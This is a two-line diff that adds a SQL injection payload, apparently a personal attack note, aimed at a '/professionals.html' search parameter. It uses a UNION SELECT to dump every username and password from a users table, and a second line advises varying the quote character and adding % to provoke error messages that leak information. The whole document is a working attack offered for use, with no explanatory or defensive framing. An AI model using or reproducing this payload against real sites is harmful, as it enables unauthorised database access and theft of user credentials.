@@ -1,0 +1,2 @@
+/professionals.html?q=" UNION SELECT 1, group_concat(username || ':' || password || '<br>') FROM users--
+                      ^^^ won't always be ', also try adding % and other characters to leak error messages !!
